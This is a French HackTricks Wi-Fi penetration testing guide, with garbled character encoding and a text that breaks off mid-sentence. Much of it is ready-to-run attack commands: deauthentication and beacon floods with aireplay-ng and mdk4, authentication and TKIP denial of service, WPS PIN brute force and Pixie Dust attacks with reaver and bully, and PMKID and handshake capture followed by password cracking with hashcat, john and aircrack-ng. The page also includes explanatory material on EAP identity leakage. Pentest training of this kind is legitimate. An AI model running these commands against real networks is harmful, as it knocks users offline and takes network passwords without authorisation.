# Test de p√©n√©tration Wifi

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des hackers exp√©riment√©s et des chasseurs de primes de bugs !

**Aper√ßus du piratage**\
Engagez-vous avec du contenu qui plonge dans le frisson et les d√©fis du piratage

**Nouvelles du piratage en temps r√©el**\
Restez √† jour avec le monde du piratage rapide gr√¢ce √† des nouvelles et des aper√ßus en temps r√©el

**Derni√®res annonces**\
Restez inform√© avec les lancements de nouvelles primes de bugs et les mises √† jour cruciales de la plateforme

**Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez √† collaborer avec les meilleurs hackers d√®s aujourd'hui !

## Commandes de base Wifi
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
```
## Outils

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Ex√©cutez airgeddon avec docker**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
### wifiphisher

Il peut r√©aliser des attaques Evil Twin, KARMA et Known Beacons, puis utiliser un mod√®le de phishing pour parvenir √† obtenir le v√©ritable mot de passe du r√©seau ou capturer des identifiants de r√©seaux sociaux.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Cet outil automatise les attaques **WPS/WEP/WPA-PSK**. Il va automatiquement :

* Mettre l'interface en mode moniteur
* Scanner les r√©seaux possibles - Et vous laisse choisir la ou les victimes
* Si WEP - Lancer des attaques WEP
* Si WPA-PSK
* Si WPS : Attaque Pixie dust et l'attaque par force brute (attention, l'attaque par force brute peut prendre beaucoup de temps). Notez qu'il n'essaie pas de PIN nul ou de PINs g√©n√©r√©s par base de donn√©es.
* Essayer de capturer le PMKID du point d'acc√®s pour le craquer
* Essayer de d√©authentifier les clients du point d'acc√®s pour capturer une poign√©e de main
* Si PMKID ou poign√©e de main, essayer de forcer le bruteforce en utilisant les 5000 meilleurs mots de passe.

## R√©sum√© des attaques

* **DoS**
* D√©authentification/dissociation -- D√©connecter tout le monde (ou un ESSID/Client sp√©cifique)
* Points d'acc√®s factices al√©atoires -- Cacher les r√©seaux, peut-√™tre faire planter les scanners
* Surcharge du point d'acc√®s -- Essayer de tuer le point d'acc√®s (g√©n√©ralement pas tr√®s utile)
* WIDS -- Jouer avec le syst√®me de d√©tection d'intrusion
* TKIP, EAPOL -- Quelques attaques sp√©cifiques pour faire un DoS sur certains points d'acc√®s
* **Cracking**
* Craquer **WEP** (plusieurs outils et m√©thodes)
* **WPA-PSK**
* **WPS** pin "Force brute"
* **WPA PMKID** force brute
* \[DoS +] **Capture de poign√©e de main WPA** + Cracking
* **WPA-MGT**
* **Capture de nom d'utilisateur**
* **Force brute** des identifiants
* **Evil Twin** (avec ou sans DoS)
* **Open** Evil Twin \[+ DoS] -- Utile pour capturer les identifiants de portail captif et/ou r√©aliser des attaques LAN
* **WPA-PSK** Evil Twin -- Utile pour les attaques r√©seau si vous connaissez le mot de passe
* **WPA-MGT** -- Utile pour capturer les identifiants d'entreprise
* **KARMA, MANA**, **Loud MANA**, **Known beacon**
* **+ Open** -- Utile pour capturer les identifiants de portail captif et/ou r√©aliser des attaques LAN
* **+ WPA** -- Utile pour capturer les poign√©es de main WPA

## DOS

### Paquets de d√©authentification

La mani√®re la plus courante de r√©aliser ce type d'attaque se fait avec des paquets de **d√©authentification**. Ce sont un type de trame de "gestion" responsable de la d√©connexion d'un appareil d'un point d'acc√®s. Forger ces paquets est la cl√© pour [pirater de nombreux r√©seaux Wi-Fi](https://null-byte.wonderhowto.com/how-to/wi-fi-hacking/), car vous pouvez d√©connecter de force n'importe quel client du r√©seau √† tout moment. La facilit√© avec laquelle cela peut √™tre fait est quelque peu effrayante et est souvent r√©alis√©e dans le cadre de la collecte d'une poign√©e de main WPA pour le cracking.

Outre l'utilisation momentan√©e de cette d√©connexion pour r√©colter une poign√©e de main √† craquer, vous pouvez √©galement laisser ces d√©authentifications continuer, ce qui a pour effet de bombarder le client avec des paquets de d√©authentification apparemment provenant du r√©seau auquel ils sont connect√©s. Comme ces trames ne sont pas chiffr√©es, de nombreux programmes tirent parti des trames de gestion en les forgeant et en les envoyant √† un ou √† tous les appareils d'un r√©seau.\
**Description de** [**ici**](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**D√©authentification en utilisant Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
* \-0 signifie d√©authentification
* 1 est le nombre de d√©authentifications √† envoyer (vous pouvez en envoyer plusieurs si vous le souhaitez) ; 0 signifie les envoyer en continu
* \-a 00:14:6C:7E:40:80 est l'adresse MAC du point d'acc√®s
* \-c 00:0F:B5:34:30:30 est l'adresse MAC du client √† d√©authentifier ; si ceci est omis, alors une d√©authentification broadcast est envoy√©e (ne fonctionne pas toujours)
* ath0 est le nom de l'interface

### Paquets de Dissociation

Les paquets de dissociation sont un autre type de trame de gestion utilis√©e pour d√©connecter un n≈ìud (signifiant tout appareil comme un ordinateur portable ou un t√©l√©phone portable) d'un point d'acc√®s √† proximit√©. La diff√©rence entre les trames de d√©authentification et de dissociation r√©side principalement dans la mani√®re dont elles sont utilis√©es.

Un PA cherchant √† d√©connecter un appareil non autoris√© enverra un paquet de d√©authentification pour informer l'appareil qu'il a √©t√© d√©connect√© du r√©seau, tandis qu'un paquet de dissociation est utilis√© pour d√©connecter tous les n≈ìuds lorsque le PA s'√©teint, red√©marre ou quitte la zone.

**Description tir√©e de** [**ici**](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Cette attaque peut √™tre r√©alis√©e par mdk4(mode "d") :**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Plus d'attaques DOS par mdk4**

**Depuis** [**ici**](https://en.kali.tools/?p=864)**.**

**MODE D'ATTAQUE b : Inondation de balises (Beacon Flooding)**

Envoie des trames de balise pour afficher de faux points d'acc√®s (APs) chez les clients. Cela peut parfois faire planter les scanners de r√©seau et m√™me les pilotes !
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**MODE D'ATTAQUE a : D√©ni de Service d'Authentification**

Envoie des trames d'authentification √† tous les points d'acc√®s trouv√©s √† port√©e. Trop de clients peuvent geler ou r√©initialiser plusieurs points d'acc√®s.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**MODE D'ATTAQUE p : Exploration et Bruteforce de SSID**

Explore les points d'acc√®s et v√©rifie les r√©ponses, utile pour v√©rifier si le SSID a √©t√© correctement d√©voil√© et si le point d'acc√®s est √† port√©e d'envoi. Le **bruteforce de SSIDs cach√©s** avec ou sans liste de mots est √©galement disponible.

**MODE D'ATTAQUE m : Exploitation des Contre-mesures Michael**

Envoie des paquets al√©atoires ou r√©injecte des doublons sur une autre file d'attente QoS pour provoquer les Contre-mesures Michael sur les **points d'acc√®s TKIP**. Le point d'acc√®s sera alors arr√™t√© pendant une minute enti√®re, ce qui en fait un **DoS** efficace.
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**MODE D'ATTAQUE e : Injection de paquets EAPOL Start et Logoff**

Inonde un point d'acc√®s avec des trames **EAPOL** Start pour l'occuper avec des **sessions factices** et ainsi l'emp√™cher de g√©rer les clients l√©gitimes. Ou d√©connecte les clients en **injectant de faux** messages EAPOL **Logoff**.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**MODE D'ATTAQUE s : Attaques pour les r√©seaux maill√©s IEEE 802.11s**

Diverses attaques sur la gestion des liens et le routage dans les r√©seaux maill√©s. Inondez les voisins et les routes, cr√©ez des trous noirs et d√©tournez le trafic !

**MODE D'ATTAQUE w : Confusion WIDS**

Confondez/Abusez des syst√®mes de d√©tection et de pr√©vention des intrusions en connectant de mani√®re crois√©e les clients √† plusieurs n≈ìuds WDS ou √† de faux points d'acc√®s voyous.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**MODE D'ATTAQUE f : Packet Fuzzer**

Un fuzzer de paquets simple avec de multiples sources de paquets et un bel ensemble de modificateurs. Soyez prudent !

### **Airgeddon**

_**Airgeddon**_ offre la plupart des attaques propos√©es dans les commentaires pr√©c√©dents :

![](<../../.gitbook/assets/image (126).png>)

## WPS

WPS signifie Wi-Fi Protected Setup. C'est une norme de s√©curit√© de r√©seau sans fil qui essaie de rendre les connexions entre un routeur et des appareils sans fil plus rapides et plus faciles. **Le WPS fonctionne uniquement pour les r√©seaux sans fil qui utilisent un mot de passe** chiffr√© avec les protocoles de s√©curit√© **WPA** Personnel ou **WPA2** Personnel. Le WPS ne fonctionne pas sur les r√©seaux sans fil qui utilisent la s√©curit√© WEP obsol√®te, qui peut √™tre facilement craqu√©e par n'importe quel hacker avec un ensemble d'outils et de comp√©tences de base. (Depuis [ici](https://www.digitalcitizen.life/simple-questions-what-wps-wi-fi-protected-setup))

Le WPS utilise un PIN de 8 chiffres pour permettre √† un utilisateur de se connecter au r√©seau, mais d'abord les 4 premiers chiffres sont v√©rifi√©s et, si corrects, alors les 4 derniers chiffres sont v√©rifi√©s. Il est donc possible de forcer brutalement la premi√®re moiti√© puis la seconde moiti√© (seulement 11000 possibilit√©s).

### Bruteforce WPS

Il existe 2 outils principaux pour effectuer cette action : Reaver et Bully.

* **Reaver** a √©t√© con√ßu pour √™tre une attaque robuste et pratique contre le WPS, et a √©t√© test√© contre une grande vari√©t√© de points d'acc√®s et d'impl√©mentations WPS.
* **Bully** est une **nouvelle impl√©mentation** de l'attaque par force brute WPS, √©crite en C. Elle pr√©sente plusieurs avantages par rapport au code reaver original : moins de d√©pendances, am√©lioration de la performance m√©moire et CPU, gestion correcte de l'endianness, et un ensemble d'options plus robuste.

Cette attaque tire parti d'une **faiblesse dans le code PIN WPS de huit chiffres** ; √† cause de ce probl√®me, le protocole **divulgue des informations sur les quatre premiers chiffres du PIN**, et le **dernier** chiffre fonctionne comme un **checksum**, ce qui facilite le bruteforce du PA WPS.\
Notez que certains dispositifs incluent des **protections contre la force brute**, qui bloquent g√©n√©ralement les **adresses MAC** qui tentent de r√©p√©ter l'attaque. Dans ce cas, la complexit√© de cette attaque augmente, car vous devriez **changer d'adresse MAC** tout en testant les PINs.

Si le code WPS valide est trouv√©, Bully et Reaver l'utiliseront pour d√©couvrir le PSK WPA/WPA2 utilis√© pour prot√©ger le r√©seau, vous pourrez donc vous connecter chaque fois que vous en aurez besoin.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Attaque par force brute intelligente**

Au lieu de commencer √† essayer chaque PIN possible, vous devriez v√©rifier s'il existe des **PINs d√©couverts pour le point d'acc√®s que vous attaquez** (en fonction du MAC du fabricant) et les **PINs g√©n√©r√©s par le logiciel**.

* La base de donn√©es des PINs connus est faite pour les points d'acc√®s de certains fabricants pour lesquels on sait qu'ils utilisent les m√™mes PINs WPS. Cette base de donn√©es contient les trois premiers octets des adresses MAC et une liste de PINs correspondants qui sont tr√®s probables pour ce fabricant.
* Il existe plusieurs algorithmes pour g√©n√©rer des PINs WPS. Par exemple, ComputePIN et EasyBox utilisent l'adresse MAC du point d'acc√®s dans leurs calculs. Mais l'algorithme Arcadyan n√©cessite √©galement un identifiant de dispositif.

### Attaque WPS Pixie Dust

Dominique Bongard a d√©couvert que certains points d'acc√®s ont des m√©thodes faibles de g√©n√©ration de **nonces** (connus sous le nom de **E-S1** et **E-S2**) qui sont cens√©s √™tre secrets. Si nous parvenons √† d√©terminer quels sont ces nonces, nous pouvons facilement trouver le PIN WPS d'un point d'acc√®s puisque le point d'acc√®s doit nous le donner dans un hash pour prouver qu'il conna√Æt √©galement le PIN, et que le client ne se connecte pas √† un point d'acc√®s malveillant. Ces E-S1 et E-S2 sont essentiellement les "cl√©s pour d√©verrouiller la bo√Æte contenant le PIN WPS". Plus d'infos ici : [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\))

En gros, certaines impl√©mentations ont √©chou√© dans l'utilisation de cl√©s al√©atoires pour chiffrer les 2 parties du PIN (car il est d√©compos√© en 2 parties pendant la communication d'authentification et envoy√© au client), donc une attaque hors ligne pourrait √™tre utilis√©e pour forcer le PIN valide.
```
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
### Attaque par PIN nul

Certaines impl√©mentations vraiment mauvaises permettaient la connexion avec un PIN nul (tr√®s √©trange √©galement). Reaver peut tester cela (Bully ne le peut pas).
```
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Toutes les attaques WPS propos√©es peuvent √™tre facilement r√©alis√©es en utilisant _**airgeddon.**_

![](<../../.gitbook/assets/image (124).png>)

* 5 et 6 vous permettent d'essayer **votre propre PIN** (si vous en avez un)
* 7 et 8 effectuent l'**attaque Pixie Dust**
* 13 vous permet de tester le **PIN NULL**
* 11 et 12 vont **recueillir les PINs li√©s au point d'acc√®s s√©lectionn√© √† partir des bases de donn√©es disponibles** et **g√©n√©rer** des **PINs** possibles en utilisant : ComputePIN, EasyBox et optionnellement Arcadyan (recommand√©, pourquoi pas ?)
* 9 et 10 testeront **chaque PIN possible**

## **WEP**

Tellement cass√© et disparu que je ne vais pas en parler. Sachez juste qu'_**airgeddon**_ a une option WEP appel√©e "All-in-One" pour attaquer ce type de protection. Plus d'outils offrent des options similaires.

![](<../../.gitbook/assets/image (125).png>)

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des hackers exp√©riment√©s et des chasseurs de primes de bugs !

**Aper√ßus du Hacking**\
Engagez-vous avec du contenu qui plonge dans l'excitation et les d√©fis du hacking

**Nouvelles du Hacking en Temps R√©el**\
Restez √† jour avec le monde du hacking rapide gr√¢ce √† des nouvelles et des aper√ßus en temps r√©el

**Derni√®res Annonces**\
Restez inform√© avec les derni√®res primes de bugs lanc√©es et les mises √† jour cruciales de la plateforme

**Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez √† collaborer avec les meilleurs hackers d√®s aujourd'hui !

## WPA/WPA2 PSK

### PMKID

En 2018, les auteurs de hashcat ont [r√©v√©l√©](https://hashcat.net/forum/thread-7717.html) un nouveau type d'attaque qui ne repose pas seulement **sur un seul paquet**, mais qui ne n√©cessite pas non plus que des clients soient connect√©s √† notre point d'acc√®s cible, mais juste une communication entre l'attaquant et le point d'acc√®s.

Il s'av√®re que **beaucoup** de routeurs modernes ajoutent un **champ optionnel** √† la fin du **premier cadre EAPOL** envoy√© par le point d'acc√®s lui-m√™me lorsqu'une personne s'associe, le soi-disant `Robust Security Network`, qui comprend quelque chose appel√© `PMKID`

Comme expliqu√© dans le post original, le **PMKID** est d√©riv√© en utilisant des donn√©es qui nous sont connues :
```
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
**Puisque la cha√Æne "PMK Name" est constante, nous connaissons √† la fois le BSSID du point d'acc√®s (AP) et de la station et le `PMK` est le m√™me que celui obtenu √† partir d'une authentification compl√®te en 4 √©tapes**, c'est tout ce dont hashcat a besoin pour craquer le PSK et r√©cup√©rer la phrase secr√®te !
Description obtenue [ici](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/).

Pour **collecter** ces informations et **forcer brutalement** localement le mot de passe, vous pouvez faire :
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
Les **PMKIDs captur√©s** seront affich√©s dans la **console** et √©galement **sauvegard√©s** √† l'int√©rieur de \_**/tmp/attack.pcap**\_
Maintenant, convertissez la capture au format **hashcat/john** et craquez-la :
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Veuillez noter que le format d'un hash correct contient **4 parties**, comme : _4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7\*566f6461666f6e65436f6e6e6563743034383131343838_\
\_\_Si le v√¥tre contient **uniquement** **3 parties**, alors, il est **invalide** (la capture PMKID n'√©tait pas valide).

Notez que `hcxdumptool` **capture √©galement les handshakes** (quelque chose comme ceci appara√Ætra : **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Vous pourriez **transformer** les **handshakes** en format **hashcat**/**john** en utilisant `cap2hccapx`
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_J'ai remarqu√© que certains handshakes captur√©s avec cet outil ne pouvaient pas √™tre crack√©s m√™me en connaissant le mot de passe correct. Je recommanderais de capturer les handshakes √©galement de mani√®re traditionnelle si possible, ou de capturer plusieurs d'entre eux en utilisant cet outil._

### Capture de Handshake

Une m√©thode pour attaquer les r√©seaux **WPA/WPA2** consiste √† capturer un **handshake** et essayer de **cracker** le mot de passe utilis√© **hors ligne**. Pour cela, vous devez trouver le **BSSID** et le **canal** du r√©seau **victime**, ainsi qu'un **client** connect√© au r√©seau.\
Une fois que vous avez ces informations, vous devez commencer √† **√©couter** toute la communication de ce **BSSID** sur ce **canal**, car, esp√©rons-le, le handshake sera envoy√© l√† :
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
Maintenant, vous devez **d√©connecter** le **client** pendant quelques secondes afin qu'il s'authentifie automatiquement √† nouveau aupr√®s du point d'acc√®s (AP) (veuillez lire la partie sur le DoS pour trouver plusieurs m√©thodes de d√©connexion d'un client) :
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, not always work
```
_Remarquez que lorsque le client est d√©sauthentifi√©, il pourrait essayer de se connecter √† un autre point d'acc√®s (AP) ou, dans d'autres cas, √† un r√©seau diff√©rent._

Une fois que des informations de handshake apparaissent dans `airodump-ng`, cela signifie que le handshake a √©t√© captur√© et vous pouvez arr√™ter l'√©coute :

![](<../../.gitbook/assets/image (172) (1).png>)

Une fois le handshake captur√©, vous pouvez le **cracker** avec `aircrack-ng` :
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### V√©rifier si la poign√©e de main est dans le fichier

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Si cet outil trouve une poign√©e de main incompl√®te d'un ESSID avant la compl√®te, il ne d√©tectera pas la valide._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Entreprise (MGT)**

**Il** est important de parler des **diff√©rentes m√©thodes d'authentification** qui pourraient √™tre utilis√©es par un Wifi d'entreprise. Pour ce type de Wifi, vous trouverez probablement dans `airodump-ng` quelque chose comme ceci :
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
**EAP** (Protocole d'Authentification Extensible) est le **squelette** de la **communication d'authentification**, sur cette base, un **algorithme d'authentification** est utilis√© par le serveur pour authentifier le **client** (**suppliant**) et dans certains cas par le client pour authentifier le serveur.
Principaux algorithmes d'authentification utilis√©s dans ce cas :

* **EAP-GTC :** C'est une m√©thode EAP pour supporter l'utilisation de jetons mat√©riels et de mots de passe √† usage unique avec EAP-PEAP. Son impl√©mentation est similaire √† MSCHAPv2, mais n'utilise pas de d√©fi par les pairs. Au lieu de cela, les mots de passe sont envoy√©s au point d'acc√®s en **texte clair** (tr√®s int√©ressant pour les attaques par d√©gradation).
* **EAP-MD-5 (Message Digest) :** Le client envoie le hachage MD5 du mot de passe. **Non recommand√©** : Vuln√©rable aux attaques par dictionnaire, pas d'authentification du serveur et aucun moyen de g√©n√©rer des cl√©s de confidentialit√© √©quivalentes au c√¢blage (WEP) par session.
* **EAP-TLS (Transport Layer Security) :** Il repose sur des **certificats c√¥t√© client et c√¥t√© serveur** pour effectuer l'authentification et peut √™tre utilis√© pour g√©n√©rer dynamiquement des cl√©s WEP bas√©es sur l'utilisateur et la session pour s√©curiser les communications ult√©rieures.
* **EAP-TTLS (Tunneled Transport Layer Security) :** **Authentification mutuelle** du client et du r√©seau via un canal chiffr√© (ou tunnel), ainsi qu'un moyen de d√©river des cl√©s WEP dynamiques, par utilisateur et par session. Contrairement √† EAP-TLS, **EAP-TTLS n√©cessite uniquement des certificats c√¥t√© serveur (le client utilisera des identifiants)**.
* **PEAP (Protected Extensible Authentication Protocol) :** PEAP est comme le protocole **EAP** mais cr√©e un **tunnel TLS** pour prot√©ger la communication. Ensuite, des protocoles d'authentification faibles peuvent √™tre utilis√©s au-dessus de EAP car ils seront prot√©g√©s par le tunnel.
* **PEAP-MSCHAPv2 :** Cela est √©galement connu sous le nom de **PEAP** car il est largement adopt√©. Il s'agit simplement du d√©fi/r√©ponse vuln√©rable appel√© MSCHAPv2 au-dessus de PEAP (il est prot√©g√© par le tunnel TLS).
* **PEAP-EAP-TLS ou simplement PEAP-TLS :** Est tr√®s similaire √† **EAP-TLS** mais un tunnel TLS est cr√©√© avant que les certificats ne soient √©chang√©s.

Vous pouvez trouver plus d'informations sur ces m√©thodes d'authentification [ici](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol) et [ici](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Capture de nom d'utilisateur

En lisant [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27), il semble que si vous utilisez **EAP**, les **messages "Identity"** doivent √™tre **pris en charge**, et le **nom d'utilisateur** va √™tre envoy√© en **clair** dans les messages **"Response Identity"**.

M√™me en utilisant l'une des m√©thodes d'authentification les plus s√©curis√©es : **PEAP-EAP-TLS**, il est possible de **capturer le nom d'utilisateur envoy√© dans le protocole EAP**. Pour ce faire, **capturez une communication d'authentification** (d√©marrez `airodump-ng` dans un canal et `wireshark` sur la m√™me interface) et filtrez les paquets par `eapol`.\
Dans le paquet "**Response, Identity**", le **nom d'utilisateur** du client appara√Ætra.

![](<../../.gitbook/assets/image (150).png>)

### Identit√©s Anonymes

(Informations prises de [https://www.interlinknetworks.com/app_notes/eap-peap.htm](https://www.interlinknetworks.com/app_notes/eap-peap.htm))

**EAP-PEAP et EAP-TTLS prennent en charge la dissimulation d'identit√©**. Dans un environnement WiFi, le point d'acc√®s (AP) g√©n√®re g√©n√©ralement une demande d'identit√© EAP dans le cadre du processus d'association. Pour pr√©server l'anonymat, le client EAP sur le syst√®me de l'utilisateur peut r√©pondre avec seulement assez d'informations pour permettre au premier serveur RADIUS de traiter la demande, comme illustr√© dans les exemples suivants.

* _**EAP-Identity = anonymous**_

> Dans cet exemple, tous les utilisateurs partageront le pseudo-nom d'utilisateur ‚Äúanonymous‚Äù. Le premier serveur RADIUS est un serveur EAP-PEAP ou EAP-TTLS qui g√®re l'extr√©mit√© serveur du protocole PEAP ou TTLS. Le type d'authentification interne (prot√©g√©) sera ensuite trait√© localement ou transmis √† un serveur RADIUS distant (d'origine).

* _**EAP-Identity = anonymous@realm_x**_

> Dans cet exemple, les utilisateurs appartenant √† diff√©rents domaines cachent leur propre identit√© mais indiquent √† quel domaine ils appartiennent afin que le premier serveur RADIUS puisse transmettre les demandes EAP-PEAP ou EAP-TTLS aux serveurs RADIUS de leur domaine d'origine qui agiront comme le serveur PEAP ou TTLS. Le premier serveur agit purement comme un n≈ìud de relais RADIUS.
>
> Alternativement, le premier serveur peut agir comme le serveur EAP-PEAP ou EAP-TTLS et soit traiter la m√©thode d'authentification prot√©g√©e ou la transmettre √† un autre serveur. Cette option peut √™tre utilis√©e pour configurer diff√©rentes politiques pour diff√©rents domaines.

Dans EAP-PEAP, une fois que le serveur PEAP et le client PEAP √©tablissent le tunnel TLS, le serveur PEAP g√©n√®re une demande d'identit√© EAP et la transmet dans le tunnel TLS. Le client r√©pond √† cette seconde demande d'identit√© EAP en envoyant une r√©ponse d'identit√© EAP contenant la v√©ritable identit√© de l'utilisateur dans le tunnel chiffr√©. Cela emp√™che quiconque d'√©couter le trafic 802.11 de d√©couvrir la v√©ritable identit√© de l'utilisateur.

EAP-TTLS fonctionne l√©g√®rement diff√©remment. Avec EAP-TTLS, le client s'authentifie g√©n√©ralement via PAP ou CHAP prot√©g√© par le tunnel TLS. Dans ce cas, le client inclura un attribut User-Name et soit un attribut Password soit CHAP-Password dans le premier message TLS envoy√© apr√®s l'√©tablissement du tunnel.

Avec l'un ou l'autre protocole, le serveur PEAP/TTLS apprend la v√©ritable identit√© de l'utilisateur une fois le tunnel TLS √©tabli. La v√©ritable identit√© peut √™tre soit sous la forme _**user@realm**_ soit simplement _**user**_. Si le serveur PEAP/TTLS authentifie √©galement l'_**utilisateur**_, il conna√Æt maintenant l'identit√© de l'utilisateur et proc√®de avec la m√©thode d'authentification prot√©g√©e par le tunnel TLS. Alternativement, le serveur PEAP/TTLS peut transmettre une nouvelle demande RADIUS au serveur RADIUS d'origine de l'utilisateur. Cette nouvelle demande RADIUS a le protocole PEAP ou TTLS retir√©. Si la m√©thode d'authentification prot√©g√©e est EAP, les messages EAP internes sont transmis au serveur RADIUS d'origine sans l'enveloppe EAP-PEAP ou EAP-TTLS. L'attribut User-Name du message RADIUS sortant contient la v√©ritable identit√© de l'utilisateur ‚Äì et non l'identit√© anonyme de l'attribut User-Name de la demande RADIUS entrante. Si la m√©thode d'authentification prot√©g√©e est PAP ou CHAP 